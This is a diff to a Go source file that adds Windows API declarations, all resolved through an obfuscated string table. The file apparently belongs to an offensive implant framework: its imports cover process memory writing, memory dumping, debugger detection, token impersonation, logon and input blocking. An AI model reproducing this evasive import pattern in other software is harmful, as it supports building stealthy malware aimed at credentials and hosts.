@@ -29,6 +29,7 @@ var (
 	funcReadFile                                            = dllKernel32.proc(crypt.Get(134)) // ReadFile
 	funcLsaClose                                            = dllAdvapi32.proc(crypt.Get(135)) // LsaClose
 	funcDeleteDC                                            = dllGdi32.proc(crypt.Get(222))    // DeleteDC
+	funcLogonUser                                           = dllAdvapi32.proc(crypt.Get(262)) // LogonUserW
 	funcWriteFile                                           = dllKernel32.proc(crypt.Get(136)) // WriteFile
 	funcOpenMutex                                           = dllKernel32.proc(crypt.Get(137)) // OpenMutexW
 	funcLocalFree                                           = dllKernel32.proc(crypt.Get(138)) // LocalFree
@@ -40,11 +41,14 @@ var (
 	funcCreateFile                                          = dllKernel32.proc(crypt.Get(140)) // CreateFileW
 	funcGetVersion                                          = dllKernel32.proc(crypt.Get(141)) // GetVersion
 	funcCancelIoEx                                          = dllKernel32.proc(crypt.Get(142)) // CancelIoEx
+	funcBlockInput                                          = dllUser32.proc(crypt.Get(253))   // BlockInput
 	funcHeapDestroy                                         = dllKernel32.proc(crypt.Get(250)) // HeapDestroy
 	funcLoadLibrary                                         = dllKernel32.proc(crypt.Get(143)) // LoadLibraryW
 	funcCreateMutex                                         = dllKernel32.proc(crypt.Get(144)) // CreateMutexW
 	funcCreateEvent                                         = dllKernel32.proc(crypt.Get(145)) // CreateEventW
 	funcHeapReAlloc                                         = dllKernel32.proc(crypt.Get(218)) // HeapReAlloc
+	funcEnumWindows                                         = dllUser32.proc(crypt.Get(254))   // EnumWindows
+	funcEnableWindow                                        = dllUser32.proc(crypt.Get(252))   // EnableWindow
 	funcSelectObject                                        = dllGdi32.proc(crypt.Get(226))    // SelectObject
 	funcDeleteObject                                        = dllGdi32.proc(crypt.Get(223))    // DeleteObject
 	funcNtTraceEvent                                        = dllNtdll.proc(crypt.Get(146))    // NtTraceEvent
@@ -54,6 +58,7 @@ var (
 	funcRevertToSelf                                        = dllAdvapi32.proc(crypt.Get(151)) // RevertToSelf
 	funcRegEnumValue                                        = dllAdvapi32.proc(crypt.Get(152)) // RegEnumValueW
 	funcModule32Next                                        = dllKernel32.proc(crypt.Get(247)) // Module32NextW
+	funcGetWindowText                                       = dllUser32.proc(crypt.Get(256))   // GetWindowTextW
 	funcModule32First                                       = dllKernel32.proc(crypt.Get(248)) // Module32FirstW
 	funcWaitNamedPipe                                       = dllKernel32.proc(crypt.Get(153)) // WaitNamedPipeW
 	funcCreateProcess                                       = dllKernel32.proc(crypt.Get(154)) // CreateProcessW
@@ -65,6 +70,7 @@ var (
 	funcOpenSemaphore                                       = dllKernel32.proc(crypt.Get(160)) // OpenSemaphoreW
 	funcRegDeleteTree                                       = dllAdvapi32.proc(crypt.Get(242)) // RegDeleteTreeW
 	funcRtlCopyMemory                                       = dllNtdll.proc(crypt.Get(221))    // RtlCopyMemory
+	funcGetWindowInfo                                       = dllUser32.proc(crypt.Get(260))   // GetWindowInfo
 	funcRegDeleteKeyEx                                      = dllAdvapi32.proc(crypt.Get(149)) // RegDeleteKeyExW
 	funcGetMonitorInfo                                      = dllUser32.proc(crypt.Get(231))   // GetMonitorInfoW
 	funcVirtualProtect                                      = dllKernel32.proc(crypt.Get(161)) // VirtualProtect
@@ -89,6 +95,8 @@ var (
 	funcGetLogicalDrives                                    = dllKernel32.proc(crypt.Get(209)) // GetLogicalDrives
 	funcOpenProcessToken                                    = dllAdvapi32.proc(crypt.Get(179)) // OpenProcessToken
 	funcGetDesktopWindow                                    = dllUser32.proc(crypt.Get(232))   // GetDesktopWindow
+	funcGetWindowLongPtr                                    = dllUser32.proc(crypt.Get(259))   // GetWindowLongPtrW
+	funcSetWindowLongPtr                                    = dllUser32.proc(crypt.Get(258))   // SetWindowLongPtrW
 	funcGetModuleHandleEx                                   = dllKernel32.proc(crypt.Get(246)) // GetModuleHandleExW
 	funcIsDebuggerPresent                                   = dllKernel32.proc(crypt.Get(180)) // IsDebuggerPresent
 	funcMiniDumpWriteDump                                   = dllDbgHelp.proc(crypt.Get(236))  // MiniDumpWriteDump
@@ -103,13 +111,17 @@ var (
 	funcNtFreeVirtualMemory                                 = dllNtdll.proc(crypt.Get(185))    // NtFreeVirtualMemory
 	funcWaitForSingleObject                                 = dllKernel32.proc(crypt.Get(186)) // WaitForSingleObject
 	funcDisconnectNamedPipe                                 = dllKernel32.proc(crypt.Get(187)) // DisconnectNamedPipe
+	funcGetWindowTextLength                                 = dllUser32.proc(crypt.Get(255))   // GetWindowTextLengthW
 	funcNtWriteVirtualMemory                                = dllNtdll.proc(crypt.Get(188))    // NtWriteVirtualMemory
 	funcLookupPrivilegeValue                                = dllAdvapi32.proc(crypt.Get(189)) // LookupPrivilegeValueW
+	funcSystemParametersInfo                                = dllUser32.proc(crypt.Get(261))   // SystemParametersInfoW
 	funcConvertSIDToStringSID                               = dllAdvapi32.proc(crypt.Get(190)) // ConvertSidToStringSidW
 	funcAdjustTokenPrivileges                               = dllAdvapi32.proc(crypt.Get(191)) // AdjustTokenPrivileges
 	funcCreateCompatibleBitmap                              = dllGdi32.proc(crypt.Get(225))    // CreateCompatibleBitmap
 	funcNtProtectVirtualMemory                              = dllNtdll.proc(crypt.Get(192))    // NtProtectVirtualMemory
 	funcCreateProcessWithToken                              = dllAdvapi32.proc(crypt.Get(193)) // CreateProcessWithTokenW
+	funcCreateProcessWithLogon                              = dllAdvapi32.proc(crypt.Get(264)) // CreateProcessWithLogonW
+	funcImpersonateLoggedOnUser                             = dllAdvapi32.proc(crypt.Get(265)) // ImpersonateLoggedOnUser
 	funcNtAllocateVirtualMemory                             = dllNtdll.proc(crypt.Get(194))    // NtAllocateVirtualMemory
 	funcRtlSetProcessIsCritical                             = dllNtdll.proc(crypt.Get(195))    // RtlSetProcessIsCritical
 	funcNtQueryInformationThread                            = dllNtdll.proc(crypt.Get(245))    // NtQueryInformationThread
@@ -117,6 +129,7 @@ var (
 	funcUpdateProcThreadAttribute                           = dllKernel32.proc(crypt.Get(197)) // UpdateProcThreadAttribute
 	funcNtQueryInformationProcess                           = dllNtdll.proc(crypt.Get(198))    // NtQueryInformationProcess
 	funcLsaQueryInformationPolicy                           = dllAdvapi32.proc(crypt.Get(199)) // LsaQueryInformationPolicy
+	funcSetLayeredWindowAttributes                          = dllUser32.proc(crypt.Get(257))   // SetLayeredWindowAttributes
 	funcSetProcessWorkingSetSizeEx                          = dllKernel32.proc(crypt.Get(251)) // SetProcessWorkingSetSizeEx
 	funcStartServiceCtrlDispatcher                          = dllAdvapi32.proc(crypt.Get(213)) // StartServiceCtrlDispatcherW
 	funcImpersonateNamedPipeClient                          = dllAdvapi32.proc(crypt.Get(200)) // ImpersonateNamedPipeClient
